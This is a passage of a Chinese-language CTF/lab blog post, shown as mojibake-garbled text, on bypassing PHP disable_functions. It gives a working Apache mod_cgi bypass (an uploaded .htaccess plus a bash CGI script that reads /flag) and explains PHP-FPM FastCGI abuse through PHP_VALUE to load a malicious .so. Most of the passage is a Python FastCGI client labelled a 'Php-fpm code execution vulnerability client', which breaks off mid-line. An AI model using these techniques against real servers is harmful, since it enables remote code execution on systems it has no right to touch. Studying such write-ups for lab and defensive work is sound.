<p>è¿™æ¬¡ä½¿ç”¨çš„æ–¹æ³•æ˜¯åˆ©ç”¨.htaccessï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šä¼ .htaccessæ¥åˆ©ç”¨apacheçš„mod_cgiæ¥ç»•è¿‡phpçš„é™åˆ¶ï¼Œè¿™ä¸ªåˆ©ç”¨æ–¹æ³•åœ¨De1CTF checkinå‡ºç°è¿‡<br>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ul>
<li>ç›®å½•ä¸‹æœ‰å†™æƒé™</li>
<li>apache ä½¿ç”¨ apache_mod_php</li>
<li>Web ç›®å½•ç»™äº† AllowOverride æƒé™</li>
<li>å¯ç”¨äº†mod_cgi  é…ç½®æ•™ç¨‹:</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hupeng1234/p/8452748.html">https://www.cnblogs.com/hupeng1234/p/8452748.html</a></p>
</blockquote>
<p>é¦–å…ˆä¸Šä¼ .htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .test</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸Šä¼ shell.test</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo&amp;&amp;cat /flag</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®shell.test</p>
<p>output:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:40080/2020_11_5_bypass_disable_function/Apache_Mod_CGI/shell.sh</span><br><span class="line">flag&#123;123456&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x04-PHP-FPM"><a href="#0x04-PHP-FPM" class="headerlink" title="0x04 PHP-FPM"></a>0x04 PHP-FPM</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/75114351[%E6%8E%A8%E8%8D%90]">https://zhuanlan.zhihu.com/p/75114351[æ¨è]</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> [pç¥å¿…å®šæ¨è,å€¼å¾—å­¦ä¹ ]</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.fpm.php">https://www.php.net/manual/zh/book.fpm.php</a></p>
<p>åŸç†ä¸Šé¢çš„å¸ˆå‚…éƒ½åˆ†æçš„å¾ˆå¥½</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Medicean/as_bypass_php_disable_functions">https://github.com/Medicean/as_bypass_php_disable_functions</a></p>
<p>æ­¤å¤–,æ¨èçœ‹ä¸€ä¸‹ä¸‹é¢æ–‡ç« ,ç†æ¸…<code>cgi</code> <code>fastcgi</code> å’Œ<code>php-fpm</code>ä¸‰è€…å…³ç³»</p>
<p><a target="_blank" rel="noopener" href="https://kknews.cc/code/69zkarp.html">https://kknews.cc/code/69zkarp.html</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/44947">https://developer.aliyun.com/article/44947</a></p>
<p><a target="_blank" rel="noopener" href="https://www.awaimai.com/371.html">https://www.awaimai.com/371.html</a></p>
<p>ä¸‹é¢æ˜¯æˆ‘ä¸ªäººç†è§£</p>
<p>å½“å¯åŠ¨php-fpmæ—¶,è¯·æ±‚è¿‡ç¨‹å¦‚ä¸‹</p>
<p>(0) php-fpm å¯åŠ¨,åŠ è½½php.ini è¿›è¡Œåˆå§‹åŒ–,ç”Ÿæˆ1ä¸ªmasterå’Œå¤šä¸ªworkerè¿›ç¨‹</p>
<p>(1) å®¢æˆ·ç«¯å‘ web serverä¸­é—´å™¨å‘é€è¯·æ±‚;</p>
<p>(2) web serverä¸­é—´å™¨å‘php-fpmå‘é€fastcgiè¯·æ±‚,ç”±workeræ¥å—å¤„ç†</p>
<p>(3)php-fpm workerè®©php-cgiå¯¹è¯·æ±‚å†…å®¹è¿›è¡Œè§£æ,å¹¶æ¥å—è¿”å›ç»“æœ,å¹¶ä¸€ä¸€è¿”å›ç»™ä¸Šä¸€å±‚,ç›´åˆ°å®¢æˆ·ç«¯æ”¶åˆ°</p>
<p>æ•´ç†æ—¶,ä¸»è¦æ€è·¯æ˜¯Pç¥ä¸Šçš„æ€è·¯,å³åˆ©ç”¨å¯¹fastgciçš„é€šè®¯,å¯ä»¥ä¿®æ”¹<code>PHP_VALUE</code>å’Œ<code>PHP_ADMIN_VALUE</code>,å¯¼è‡´é€šè¿‡åŠ è½½æ¶æ„soæ–‡ä»¶,ä»è€Œç»•è¿‡disable_function</p>
<p>è€Œantswordä¸Šæ’ä»¶çš„åŸç†æ˜¯ä¹Ÿæ˜¯è¿™ç±»æ€è·¯,ä½†æ›´ç»çš„æ˜¯,å…¶soæ–‡ä»¶(å°±æ˜¯system ç›´æ¥å‘½ä»¤æ‰§è¡Œ php -n -S 127.0.0.1:61111 -t /var/www/html/ )ä¼šå¼€å¯ä¸€ä¸ªæ–°ç«¯å£çš„web server(-n  ä¸å†ä½¿ç”¨php.ini),åŒæ—¶è®¿é—®proxy.php(å¯†ç è¿˜æœ‰ä½ åŸæ¥çš„å¯†ç )è¿›è¡Œä»£ç†è®¿é—®,ä»è€Œç»•è¿‡disable_function</p>
<p>å…·ä½“åˆ†æ:</p>
<p><a target="_blank" rel="noopener" href="https://tmr.js.org/p/a63cefbc/">https://tmr.js.org/p/a63cefbc/</a></p>
<p>ä¸‹é¢æ˜¯å…·ä½“å¤ç°:</p>
<p>ç¯å¢ƒ: </p>
<p>antswordproject/antsword-labs/5</p>
<p><img src="http://img.xzaslxr.xyz/img/image-20201115173845985.png" alt="image-20201115173845985"></p>
<p>ssrf ä»£ç  from <a target="_blank" rel="noopener" href="https://www.mrkaixin.top/posts/6a3f7da8/">https://www.mrkaixin.top/posts/6a3f7da8/</a></p>
<p>ç”¨äºç”Ÿæˆå®é™…ä¸php-fpmé“¾æ¥çš„åè®®å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># ä»¥ä¸‹æ˜¯åŸè„šæœ¬å‘åŒ…çš„è¿‡ç¨‹</span></span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, help=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, help=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, help=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, help=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9984&#x27;</span>, <span class="comment">#æœ¬åœ°é“¾æ¥ç«¯å£ 9985</span></span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,<span 